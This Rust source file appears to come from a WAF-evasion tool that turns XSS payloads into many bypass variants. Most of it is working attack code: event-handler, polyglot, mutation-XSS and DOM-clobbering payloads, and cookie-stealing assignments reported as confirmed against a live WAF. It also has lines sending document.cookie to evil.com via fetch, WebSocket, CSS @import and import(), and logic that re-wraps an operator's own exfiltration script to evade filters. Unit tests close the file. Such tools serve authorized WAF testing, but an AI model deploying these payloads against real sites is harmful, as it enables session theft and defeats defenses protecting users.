//! XSS grammar-aware payload mutation.
//!
//! Understands HTML/JavaScript semantics and generates equivalent XSS
//! payloads using different DOM elements, event handlers, and execution
//! contexts. A WAF blocking `<script>alert(1)</script>` will miss
//! `<img src=x onerror=confirm(1)>`.
//!
//! # Technique depth
//!
//! 1. **Tag/event substitution** — 15+ tag/event combinations
//! 2. **Execution function rotation** — 15 alternative JS exec paths
//! 3. **URI scheme payloads** — javascript:, data:, blob:
//! 4. **DOM clobbering** — Override named properties via DOM nodes
//! 5. **Polyglot XSS** — Payloads valid in multiple injection contexts
//! 6. **Mutation XSS** — Exploit HTML parser differentials
//! 7. **Context-aware generation** — HTML attr, JS string, URL contexts
//! 8. **Prototype chain execution** — constructor.constructor chains
//! 9. **Iframe srcdoc smuggling** — Nested HTML via srcdoc attribute

/// A single XSS mutation with metadata.
#[derive(Debug, Clone)]
pub struct XssMutation {
    /// The mutated payload.
    pub payload: String,
    /// Human-readable description of what changed.
    pub description: String,
    /// Which mutation rules were applied.
    pub rules_applied: Vec<&'static str>,
}

// ──────────────────────────────────────────────
//  HTML tag + event handler combinations
// ──────────────────────────────────────────────

/// Each tuple: (prefix before exec function, suffix after exec function, extra attributes).
///
/// Audit (2026-05-10): removed dead vectors that don't actually fire
/// in any modern browser. Shipping a "grammar-aware XSS mutator" that
/// emits payloads which never execute is a credibility hit — the
/// scanner reports a probe sent and the user assumes it represents a
/// real test, when it's just noise the WAF correctly ignores.
///   * `<object data=javascript:>` — disabled in all browsers ~2012
///   * `<isindex>` — obsolete since HTML5; not implemented anywhere
const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
    ("<img src=x onerror=", ">", ""),
    ("<svg onload=", ">", ""),
    ("<svg/onload=", ">", ""),
    ("<body onload=", ">", ""),
    ("<details open ontoggle=", ">", ""),
    ("<video src=x onerror=", ">", ""),
    ("<audio src=x onerror=", ">", ""),
    ("<input onfocus=", " autofocus>", ""),
    ("<marquee onstart=", ">", ""),
    ("<a href=javascript:", ">click</a>", ""),
    ("<div onmouseover=", ">hover</div>", ""),
    ("<input type=image src=x onerror=", ">", ""),
    (
        "<form><button formaction=javascript:",
        ">click</button></form>",
        "",
    ),
    ("<select autofocus onfocus=", "></select>", ""),
    ("<textarea autofocus onfocus=", "></textarea>", ""),
    ("<keygen autofocus onfocus=", ">", ""),
    ("<embed src=x onerror=", ">", ""),
    (
        "<style>@import'//evil.com?</style><img src=x onerror=",
        ">",
        "",
    ),
];

// ──────────────────────────────────────────────
//  JavaScript execution functions
// ──────────────────────────────────────────────
//  XSS payload corpus — loaded from rules/xss/payloads.toml.
//
// Tier-B community-extensible: append a new `[[exec_function]]` /
// `[[uri_scheme]]` / `[[svg]]` / `[[mathml]]` / `[[markdown]]` row in
// the TOML to teach the mutator a new shape; no Rust changes required.
// ──────────────────────────────────────────────

#[derive(serde::Deserialize)]
struct XssPayloadRules {
    exec_function: Vec<ExecFunctionEntry>,
    uri_scheme: Vec<PayloadEntry>,
    svg: Vec<PayloadEntry>,
    mathml: Vec<PayloadEntry>,
    markdown: Vec<PayloadEntry>,
}

#[derive(serde::Deserialize)]
struct ExecFunctionEntry {
    template: String,
}

#[derive(serde::Deserialize)]
struct PayloadEntry {
    payload: String,
}

fn xss_payload_rules() -> &'static XssPayloadRules {
    static RULES: std::sync::OnceLock<XssPayloadRules> = std::sync::OnceLock::new();
    RULES.get_or_init(|| {
        let raw = include_str!("../../rules/xss/payloads.toml");
        toml::from_str(raw).expect("rules/xss/payloads.toml must parse")
    })
}

fn exec_functions() -> &'static [ExecFunctionEntry] {
    &xss_payload_rules().exec_function
}
fn uri_schemes() -> &'static [PayloadEntry] {
    &xss_payload_rules().uri_scheme
}
fn svg_payloads() -> &'static [PayloadEntry] {
    &xss_payload_rules().svg
}
fn mathml_payloads() -> &'static [PayloadEntry] {
    &xss_payload_rules().mathml
}
fn markdown_payloads() -> &'static [PayloadEntry] {
    &xss_payload_rules().markdown
}

// ──────────────────────────────────────────────
//  Public API
// ──────────────────────────────────────────────

/// Check whether the payload contains any XSS-relevant signals.
///
/// Audit (2026-05-10): pre-fix this fired on benign substrings like
/// `window.onerror` in code documentation, `confirm(...)` in API
/// docs, or HTML tag names in security-write-ups. The mutator then
/// emitted XSS variants from non-XSS input — wasted work the
/// scanner reported as if it were a real probe. Now we score
/// signals: STRONG (a real `<tag attr=` or `javascript:` URL) is
/// worth 2 points, WEAK (bare exec function name without
/// surrounding tag context, lone event-handler keyword) is worth 1.
/// Need >= 2 to count. A docstring containing only `confirm(` no
/// longer triggers; a docstring containing `<script>confirm(1)` does.
fn has_xss_signals(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();

    let mut score = 0u32;

    // STRONG signals — anything that requires a markup or JS-URL
    // context to appear in source text. Two points each.
    let strong = [
        "<script",
        "</script>",
        "<img ",
        "<svg",
        "<iframe",
        "<body",
        "<math",
        "<mtext",
        "<details",
        "<video ",
        "<audio ",
        "<marquee",
        "<object ",
        "<form",
        "<textarea",
        "<keygen",
        "<embed",
        "<noscript",
        "<foreignobject",
        "javascript:",
        "data:text/html",
        "[x](javascript:",
        "![x](javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "onfocus=",
        "onmouseover=",
        "onbegin=",
        "ontoggle=",
        "onstart=",
        "srcdoc=",
    ];
    for sig in &strong {
        if lower.contains(sig) {
            score = score.saturating_add(2);
        }
    }

    // WEAK signals — function-name substrings that show up in
    // perfectly innocent contexts (API docs, security write-ups,
    // log lines). One point each. On their own, NOT enough; combine
    // with a strong signal or each other to cross the threshold.
    let weak = [
        "alert(",
        "confirm(",
        "prompt(",
        "eval(",
        "document.cookie",
        "window.location",
    ];
    for sig in &weak {
        if lower.contains(sig) {
            score = score.saturating_add(1);
        }
    }

    score >= 2
}

/// Generate grammar-aware mutations of an XSS payload.
///
/// Returns an empty vector if the input does not contain any XSS signals.
/// This prevents generating unrelated tag/event variants for plain text.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
    if !has_xss_signals(payload) {
        return Vec::new();
    }
    // ANTI-RIG: a payload carrying a concrete exfil target, transport
    // sink, obfuscated delivery, or remote host is a STRUCTURED attack.
    // Swapping the canned `alert(1)` library in for it ships a
    // different, weaker payload that steals nothing — and the
    // de-rigged bench would score the non-attack as a "bypass". For
    // those we re-template the operator's ACTUAL JavaScript into the
    // evasion arsenal instead. A bare `alert(1)` /
    // `alert(document.domain)` proof-of-concept is deliberately NOT
    // structured: there the canned tag/event/polyglot arsenal IS the
    // correct, semantically-equivalent product.
    if is_structured_xss(payload) {
        return structured_mutate(payload, max_mutations);
    }
    let mut results = Vec::new();

    // ── Priority 0: paren-free / bracket-free assignment XSS ──────────
    // Promoted to FIRST slot for high-paranoia WAFs (naxsi, AWS WAF
    // managed) that block any `<`, `()`, or `[...]` byte sequence.
    // These payloads are exploitable in JS-context reflection (e.g.
    // `<script>var x="USERINPUT"</script>` after a `";...//` breakout)
    // and don't trigger naxsi's libinjection because they have no
    // function calls.
    //
    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
    //   location=document.cookie         → 200 ✓
    //   top.location=document.cookie     → 200 ✓
    //   document.title=document.cookie   → 200 ✓
    //   self.location=name               → 200 ✓
    //   window.name=document.cookie      → 200 ✓
    for candidate in [
        "location=document.cookie",
        "top.location=document.cookie",
        "document.location=document.cookie",
        "location.href=document.cookie",
        "document.title=document.cookie",
        "document.body.innerHTML=document.cookie",
        "self.location=name",
        "window.name=document.cookie",
        "top.location=document.URL",
        "location=document.URL",
    ] {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: candidate.to_string(),
            description: "paren-free assignment XSS (cookie/URL exfil)".into(),
            rules_applied: vec!["xss_paren_free"],
        });
    }

    // Strategy budget: reserve capacity for later strategies to avoid
    // strategy 1 (tag/event × exec = 300 combos) consuming everything.
    let tag_event_budget = (max_mutations * 40 / 100).max(5);

    // Strategy 1: Tag/event substitution with all exec functions
    for (prefix, suffix, _extra) in TAG_EVENT_COMBOS {
        for entry in exec_functions() {
            if results.len() >= tag_event_budget {
                break;
            }
            let exec_fn = entry.template.as_str();
            let mutated = format!("{prefix}{exec_fn}{suffix}");
            if mutated != payload {
                results.push(XssMutation {
                    payload: mutated,
                    description: format!("tag/event: {prefix}{exec_fn}"),
                    rules_applied: vec!["tag_event_swap"],
                });
            }
        }
        if results.len() >= tag_event_budget {
            break;
        }
    }

    // Strategy 2: Case alternation on tag names
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<ScRiPt>alert(1)</sCrIpT>".into(),
            description: "case alternation on script tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<IMG SRC=x OnErRoR=alert(1)>".into(),
            description: "case alternation on img tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }

    // Strategy 3: Null byte injection — REMOVED (audit 2026-05-10).
    // Modern HTML parsers (whatwg algorithm) treat `\0` inside a tag
    // name as U+FFFD or simply terminate the tag. The vector never
    // executes; shipping it as a "valid XSS variant" was a credibility
    // lie. If a WAF really does drop the NUL and the upstream then
    // accepts the truncated `<scr` as `<script`, that's a
    // WAF-specific bug — handle it via a per-WAF profile, not a
    // global default mutation.

    // Strategy 4: URI scheme payloads
    for entry in uri_schemes() {
        if results.len() >= max_mutations {
            break;
        }
        let scheme = entry.payload.as_str();
        results.push(XssMutation {
            payload: scheme.to_string(),
            description: format!("URI scheme: {}", &scheme[..scheme.len().min(30)]),
            rules_applied: vec!["uri_scheme"],
        });
    }

    // Strategy 5: SVG-specific payloads
    for entry in svg_payloads() {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: entry.payload.clone(),
            description: "SVG animation/script execution".into(),
            rules_applied: vec!["svg_payload"],
        });
    }

    // Strategy 6: HTML entity encoding of tag characters
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;".into(),
            description: "hex HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;".into(),
            description: "decimal HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }

    // Strategy 7: Polyglot XSS payloads
    let polyglots = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
        "'-alert(1)-'",
        "\"onmouseover=alert(1)//",
        "</script><svg onload=alert(1)>",
        "*/alert(1)/*",
        "\" onfocus=alert(1) autofocus=\"",
        "' onfocus=alert(1) autofocus='",
    ];
    for poly in &polyglots {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: poly.to_string(),
            description: format!("polyglot: {}...", &poly[..poly.len().min(30)]),
            rules_applied: vec!["polyglot"],
        });
    }

    // Strategy 8: DOM clobbering
    let dom_clobber = [
        "<form name=body><input name=innerHTML value='<img src=x onerror=alert(1)>'></form>",
        "<a id=x name=x href=javascript:alert(1)></a>",
        "<img src=x onerror=window.name='alert(1)';eval(name)>",
        "<form><output name=innerHTML><img src=x onerror=alert(1)></output></form>",
    ];
    for clobber in &dom_clobber {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: clobber.to_string(),
            description: "DOM clobbering".into(),
            rules_applied: vec!["dom_clobber"],
        });
    }

    // Strategy 9: Iframe srcdoc smuggling
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>".into(),
            description: "iframe srcdoc with HTML-entity-encoded script".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'></iframe>".into(),
            description: "iframe srcdoc with entity-encoded img".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }

    // Strategy 10: Mutation XSS
    let mutation_xss = [
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<table><caption><img src=x onerror=alert(1)></table>",
        "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "</title><svg onload=alert(1)>",
        "</style><svg onload=alert(1)>",
        "</xmp><svg onload=alert(1)>",
    ];
    for mxss in &mutation_xss {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: mxss.to_string(),
            description: "mutation XSS via parser differentials".into(),
            rules_applied: vec!["mutation_xss"],
        });
    }

    // Strategy 11: window.name exploitation
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>eval(window.name)</script>".into(),
            description: "window.name eval".into(),
            rules_applied: vec!["window_name"],
        });
    }

    // Strategy 12: Prototype chain override — REMOVED (audit 2026-05-10).
    // The classic `this.onerror=null;{}.valueOf=alert;throw 1` doesn't
    // reliably trigger alert(): `throw` propagates to window.onerror,
    // not the element handler, so the assigned `valueOf` is never
    // coerced. Shipping it as a working mutation misled scanner output.

    // Strategy 13: Template literal injection (backtick payloads)
    let template_literals = [
        "<img src=x onerror=alert`1`>",
        "<svg onload=`${alert(1)}`>",
        "<img src=x onerror=window[`al`+`ert`](1)>",
        "<img src=x onerror=[].find(alert)>",
        "<img src=x onerror=[1].map(alert)>",
        "<img src=x onerror=[1].forEach(alert)>",
        "<img src=x onerror=[1].filter(alert)>",
    ];
    for tl in &template_literals {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: tl.to_string(),
            description: "template literal / array method exec".into(),
            rules_applied: vec!["template_literal"],
        });
    }

    // Strategy 14: import() dynamic module execution
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>import('data:text/javascript,alert(1)')</script>".into(),
            description: "dynamic import() with data: URI".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=import('//evil.com/xss.js')>".into(),
            description: "dynamic import() from remote".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }

    // Strategy 15: CSS injection for data exfiltration
    //
    // Audit (2026-05-10): removed `<div style=background-image:url(
    // javascript:alert(1))>`. CSS `url()` has NEVER executed JavaScript
    // — that vector is from before CSS3 and was killed by every browser
    // implementation. The other three are real exfil channels (CSS
    // imports, request leakage, external stylesheet) and stay.
    let css_payloads = [
        "<style>@import url('//evil.com/log?token='+document.cookie)</style>",
        "<style>*{background:url('//evil.com/?'+document.cookie)}</style>",
        "<link rel=stylesheet href='//evil.com/exfil.css'>",
    ];
    for css in &css_payloads {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: css.to_string(),
            description: "CSS-based injection / exfiltration".into(),
            rules_applied: vec!["css_injection"],
        });
    }

    // Strategy 16: WebSocket-based exfiltration
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"new WebSocket('ws://evil.com/'+document.cookie)\">"
                .into(),
            description: "WebSocket exfiltration".into(),
            rules_applied: vec!["websocket_exfil"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"fetch('//evil.com/?c='+document.cookie)\">".into(),
            description: "fetch() exfiltration".into(),
            rules_applied: vec!["fetch_exfil"],
        });
    }

    // Strategy 17: Shadow DOM injection
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<div id=host></div><script>host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>".into(),
            description: "shadow DOM injection".into(),
            rules_applied: vec!["shadow_dom"],
        });
    }

    // Strategy 18: MathML context payloads
    for entry in mathml_payloads() {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: entry.payload.clone(),
            description: "MathML parser-differential XSS".into(),
            rules_applied: vec!["mathml"],
        });
    }

    // Strategy 19: Markdown context payloads
    for entry in markdown_payloads() {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: entry.payload.clone(),
            description: "Markdown link/HTML injection XSS".into(),
            rules_applied: vec!["markdown"],
        });
    }

    results.truncate(max_mutations);
    results
}

/// True when the payload carries a concrete data-exfiltration target,
/// transport sink, obfuscated delivery, or remote host — i.e. its
/// value is NOT "pop an alert" but "steal X / call out to Y". For
/// those, the fixed `alert(1)` library is a *different* payload, never
/// a mutation. A bare `alert(1)` / `confirm(1)` /
/// `alert(document.domain)` proof-of-concept is deliberately NOT
/// structured: there the canned tag/event/polyglot arsenal IS the
/// equivalent product, so it keeps the existing path untouched.
pub(crate) fn is_structured_xss(payload: &str) -> bool {
    let lc = payload.to_ascii_lowercase();
    const STRUCTURED: &[&str] = &[
        "document.cookie",
        "localstorage",
        "sessionstorage",
        "indexeddb",
        "fetch(",
        "xmlhttprequest",
        "sendbeacon(",
        ".sendbeacon",
        "navigator.sendbeacon",
        "navigator.credentials",
        "websocket",
        "new image",
        "eventsource(",
        "import(",
        "atob(",
        "eval(name",
        "eval(window.name",
        "eval(location",
        "eval(document.cookie",
        "http://",
        "https://",
        "ws://",
        "wss://",
        "=//",
        "('//",
        "(\"//",
        "+'//",
        "+\"//",
        ",'//",
        ",\"//",
    ];
    STRUCTURED.iter().any(|m| lc.contains(m))
}

/// The attack's class-defining tokens: the exact technique markers it
/// uses plus the operator's exfil host. A real evasion preserves at
/// least one; a canned `alert(1)` substitution carries none.
fn structured_xss_markers(payload: &str) -> Vec<String> {
    let lc = payload.to_ascii_lowercase();
    let mut markers: Vec<String> = Vec::new();
    const TECH: &[&str] = &[
        "document.cookie",
        "localstorage",
        "sessionstorage",
        "indexeddb",
        "fetch(",
        "xmlhttprequest",
        "sendbeacon",
        "navigator.credentials",
        "websocket",
        "new image",
        "eventsource(",
        "import(",
        "atob(",
        "eval(name",
        "eval(window.name",
        "eval(location",
    ];
    for t in TECH {
        if lc.contains(t) {
            markers.push((*t).to_string());
        }
    }
    // Operator's exfil host — the single most attack-defining token; a
    // canned variant will never reproduce it.
    let b = lc.as_bytes();
    let mut i = 0;
    while i + 1 < b.len() {
        if b[i] == b'/' && b[i + 1] == b'/' {
            let mut j = i + 2;
            while j < b.len() {
                let c = b[j];
                if c.is_ascii_alphanumeric() || c == b'.' || c == b'-' {
                    j += 1;
                } else {
                    break;
                }
            }
            let host = lc[i + 2..j].trim_matches('.');
            if host.len() >= 4 && host.contains('.') {
                markers.push(host.to_string());
            }
            i = j.max(i + 2);
        } else {
            i += 1;
        }
    }
    markers.sort();
    markers.dedup();
    markers
}

/// Pull the operator's actual JavaScript out of an XSS payload so it
/// can be re-templated into other elements/contexts (the genuine
/// evasion) instead of being discarded for a canned `alert(1)`.
fn extract_exec_body(payload: &str) -> Option<String> {
    let bytes = payload.as_bytes();
    let lb = payload.to_ascii_lowercase().into_bytes();

    // 1. First inline event handler:  on<name> = <value>
    let mut k = 0;
    while k + 2 < lb.len() {
        if lb[k] == b'o'
            && lb[k + 1] == b'n'
            && lb[k + 2].is_ascii_alphabetic()
            && (k == 0 || !lb[k - 1].is_ascii_alphabetic())
        {
            let mut e = k + 2;
            while e < lb.len() && lb[e].is_ascii_alphabetic() {
                e += 1;
            }
            let mut p = e;
            while p < lb.len() && lb[p].is_ascii_whitespace() {
                p += 1;
            }
            if p < lb.len() && lb[p] == b'=' {
                p += 1;
                while p < lb.len() && lb[p].is_ascii_whitespace() {
                    p += 1;
                }
                if p < bytes.len() && (bytes[p] == b'"' || bytes[p] == b'\'') {
                    let q = bytes[p];
                    let start = p + 1;
                    let mut end = start;
                    while end < bytes.len() && bytes[end] != q {
                        end += 1;
                    }
                    let v = payload[start..end].trim();
                    if !v.is_empty() {
                        return Some(v.to_string());
                    }
                } else {
                    let start = p;
                    let mut end = start;
                    while end < bytes.len() && bytes[end] != b'>' {
                        end += 1;
                    }
                    let v = payload[start..end].trim();
                    if !v.is_empty() {
                        return Some(v.to_string());
                    }
                }
            }
        }
        k += 1;
    }

    let lc = payload.to_ascii_lowercase();

    // 2. javascript: URL scheme
    if let Some(pos) = lc.find("javascript:") {
        let start = pos + "javascript:".len();
        let rest = &payload[start..];
        let end = rest
            .find(|c| c == '"' || c == '\'' || c == '>')
            .unwrap_or(rest.len());
        let v = rest[..end].trim();
        if !v.is_empty() {
            return Some(v.to_string());
        }
    }

    // 3. <script> … </script> inner text
    if let Some(open) = lc.find("<script") {
        if let Some(gt) = lc[open..].find('>') {
            let s = open + gt + 1;
            let end = lc[s..].find("</script").map(|x| s + x).unwrap_or(lc.len());
            let v = payload[s..end].trim();
            if !v.is_empty() {
                return Some(v.to_string());
            }
        }
    }

    // 4. Bare JS expression / breakout with no markup at all
    if !payload.contains('<') {
        let v = payload.trim();
        if !v.is_empty() {
            return Some(v.to_string());
        }
    }

    None
}

/// Structured-attack path: re-template the operator's REAL JavaScript
/// into the full tag/event/scheme/breakout arsenal, then enforce that
/// every surviving variant still carries the attack's defining
/// construct. This is the XSS analogue of the SQL `is_structured_attack`
/// chokepoint — it makes the variants genuine evasions of THIS attack
/// instead of a canned `alert(1)` the de-rigged bench would reject.
fn structured_mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
    let mut results: Vec<XssMutation> = Vec::new();

    // The attack exactly as written is always a valid candidate.
    let original = payload.trim().to_string();
    results.push(XssMutation {
        payload: original.clone(),
        description: "structured XSS: original attack (passthrough)".into(),
        rules_applied: vec!["structured_passthrough"],
    });

    if let Some(body) = extract_exec_body(payload) {
        // Only re-nest when the JS has no markup of its own (otherwise
        // `<img …><img …>` is malformed and not a real variant).
        if !body.contains('<') {
            for (prefix, suffix, _extra) in TAG_EVENT_COMBOS {
                if results.len() >= max_mutations {
                    break;
                }
                let v = format!("{prefix}{body}{suffix}");
                if v != original {
                    results.push(XssMutation {
                        payload: v,
                        description: format!("structured XSS retargeted into {prefix}…"),
                        rules_applied: vec!["structured_tag_event_retarget"],
                    });
                }
            }
            if results.len() < max_mutations {
                results.push(XssMutation {
                    payload: format!("javascript:{body}"),
                    description: "structured XSS in javascript: URL".into(),
                    rules_applied: vec!["structured_js_uri"],
                });
            }
            for (wrap_pre, wrap_suf, rule) in [
                ("\"><img src=x onerror=", ">", "structured_attr_breakout"),
                ("'><img src=x onerror=", ">", "structured_attr_breakout"),
                ("</script><svg onload=", ">", "structured_js_breakout"),
                ("</title><svg onload=", ">", "structured_rcdata_breakout"),
                ("<svg/onload=", ">", "structured_slash_evasion"),
            ] {
                if results.len() >= max_mutations {
                    break;
                }
                results.push(XssMutation {
                    payload: format!("{wrap_pre}{body}{wrap_suf}"),
                    description: "structured XSS context breakout".into(),
                    rules_applied: vec![rule],
                });
            }
            if results.len() < max_mutations {
                results.push(XssMutation {
                    payload: format!("<SvG OnLoAd={body}>"),
                    description: "structured XSS case-permuted element".into(),
                    rules_applied: vec!["structured_case_alternation"],
                });
            }
        }
    }

    // Chokepoint: every surviving variant MUST still carry the attack's
    // defining construct (exfil host / cookie read / transport sink).
    // A variant that lost all of them is not this attack any more — the
    // exact failure mode the rig exploited.
    let markers = structured_xss_markers(payload);
    if !markers.is_empty() {
        results.retain(|m| {
            let lc = m.payload.to_ascii_lowercase();
            markers.iter().any(|mk| lc.contains(mk.as_str()))
        });
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tag_event_mutations_produced() {
        let mutations = mutate("<script>alert(1)</script>", 20);
        assert!(!mutations.is_empty());
        let has_img = mutations.iter().any(|m| m.payload.contains("<img"));
        let has_svg = mutations.iter().any(|m| m.payload.contains("<svg"));
        assert!(has_img || has_svg, "should use alternative tags");
    }

    #[test]
    fn exec_function_rotation() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_confirm = mutations.iter().any(|m| m.payload.contains("confirm"));
        let has_eval = mutations.iter().any(|m| m.payload.contains("eval("));
        assert!(has_confirm || has_eval, "should rotate exec functions");
    }

    #[test]
    fn uri_scheme_variants() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_uri = mutations
            .iter()
            .any(|m| m.payload.starts_with("javascript:"));
        assert!(has_uri, "should have javascript: URI scheme variant");
    }

    #[test]
    fn svg_animate_variant() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_animate = mutations.iter().any(|m| m.payload.contains("onbegin"));
        assert!(has_animate, "should have SVG animate variant");
    }

    #[test]
    fn polyglot_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_polyglot = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"polyglot"));
        assert!(has_polyglot, "should have polyglot variant");
    }

    #[test]
    fn dom_clobber_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_clobber = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"dom_clobber"));
        assert!(has_clobber, "should have DOM clobbering variant");
    }

    #[test]
    fn mutation_xss_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_mxss = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mutation_xss"));
        assert!(has_mxss, "should have mutation XSS variant");
    }

    #[test]
    fn srcdoc_smuggle_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_srcdoc = mutations.iter().any(|m| m.payload.contains("srcdoc"));
        assert!(has_srcdoc, "should have iframe srcdoc smuggling variant");
    }

    #[test]
    fn no_mutations_for_non_xss() {
        let mutations = mutate("hello world", 10);
        assert!(
            mutations.is_empty(),
            "non-XSS input should not produce mutations"
        );
    }

    #[test]
    fn mathml_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_mathml = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mathml"));
        assert!(has_mathml, "should have MathML variant");
    }

    #[test]
    fn markdown_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_markdown = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"markdown"));
        assert!(has_markdown, "should have Markdown variant");
    }

    #[test]
    fn max_mutations_respected() {
        let mutations = mutate("<script>alert(1)</script>", 5);
        assert!(mutations.len() <= 5);
    }

    #[test]
    fn high_volume_does_not_panic() {
        let _ = mutate("<script>alert(1)</script>", 1000);
    }
}
